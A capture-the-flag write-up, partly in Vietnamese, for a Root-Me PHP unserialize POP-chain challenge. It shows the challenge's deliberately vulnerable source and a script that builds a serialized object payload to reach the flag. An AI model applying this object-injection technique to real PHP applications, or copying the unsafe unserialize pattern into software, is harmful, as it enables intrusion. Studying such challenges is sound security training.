#[PHP - Unserialize Pop Chain](https://www.root-me.org/en/Challenges/Web-Server/PHP-Unserialize-Pop-Chain)
```php
    <?php
     
    $getflag = false;
     
    class GetMessage {
        function __construct($receive) {
            if ($receive === "HelloBooooooy") {
                die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
            } else {
                $this->receive = $receive;
            }
        }
     
        function __toString() {
            return $this->receive;
        }
     
        function __destruct() {
            global $getflag;
            if ($this->receive !== "HelloBooooooy") {
                die("[FRIEND]: Hm.. you don't seem to be the friend I was waiting for..<br>");
            } else {
                if ($getflag) {
                    include("flag.php");
                    echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
                }
            }
        }
    }
     
    class WakyWaky {
        function __wakeup() {
            echo "[YOU]: ".$this->msg."<br>";
        }
     
        function __toString() {
            global $getflag;
            $getflag = true;
            return (new GetMessage($this->msg))->receive;
        }
    }
     
    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        die();
    }
     
    if (isset($_POST["data"]) && !empty($_POST["data"])) {
        unserialize($_POST["data"]);
    }
     
    ?>
     
    <!DOCTYPE html>
    <html lang="en" dir="ltr">
      <head>
        <meta charset="UTF-8">
        <title>PHP - Unserialize Pop Chain</title>
      </head>
      <body>
        <h1>PHP - Unserialize Pop Chain</h1>
        <hr>
        <br>
        <p>
          Can you bypass the security your friend put in place to access the flag?
        </p>
        <br>
        <form class="" action="index.php" method="post">
          <textarea name="data" rows="5" cols="33" style="width:35%"></textarea>
          <br>
          <br>
          <button type="submit" name="button" style="width:35%">Submit</button>
        </form>
        <br>
        <p>
          You can also <a href="?source">View the source</a>
        </p>
      </body>
    </html>
```
Payload
```php
<?php

class GetMessage {
    public $receive;
}

class WakyWaky {
    public $msg;
}

// Bước 1: Tạo đối tượng GetMessage để kích hoạt __destruct() sau này
$a = new GetMessage();
$a->receive = "HelloBooooooy";

// Bước 2: Tạo đối tượng WakyWaky và đặt thuộc tính $msg là đối tượng GetMessage
$c = new WakyWaky();
$c->msg = $a;

// Bước 3: Tạo đối tượng WakyWaky chứa đối tượng WakyWaky khác
$d = new WakyWaky();
$d->msg = $c;

// Bước 4: Tuần tự hóa đối tượng ngoài cùng
$payload = serialize($d);

// In ra payload cuối cùng để sử dụng
echo $payload;
```
Giải thích chuỗi tấn công (Pop Chain)
Khi payload được gửi đi và unserialize() được gọi, chuỗi sự kiện sẽ diễn ra theo đúng thứ tự bạn mong muốn:

PHP giải chuỗi payload, tạo ra đối tượng $d (là một đối tượng WakyWaky).

Hàm __wakeup() của đối tượng $d được kích hoạt.

Lệnh echo "[YOU]: ".$this->msg."<br>"; được thực thi.

PHP cố gắng nối chuỗi "[YOU]: " với $d->msg.

Vì $d->msg là một đối tượng WakyWaky khác, PHP sẽ tìm cách chuyển đổi nó thành chuỗi, và điều này sẽ kích hoạt hàm __toString() của đối tượng $d->msg (tức là đối tượng $c).

Khi __toString() của $c được gọi, biến toàn cục $getflag sẽ được đặt thành true.

Hàm __toString() sau đó sẽ trả về (new GetMessage($this->msg))->receive.

Khi chương trình kết thúc, PHP sẽ gọi hàm hủy __destruct() của đối tượng GetMessage mà chúng ta đã tạo ban đầu.

Lúc này, $this->receive là "HelloBooooooy" và $getflag là true.

Điều kiện if ($this->receive !== "HelloBooooooy") sẽ là false, và if ($getflag) sẽ là true.

Cuối cùng, include("flag.php") được thực thi và bạn lấy được cờ.

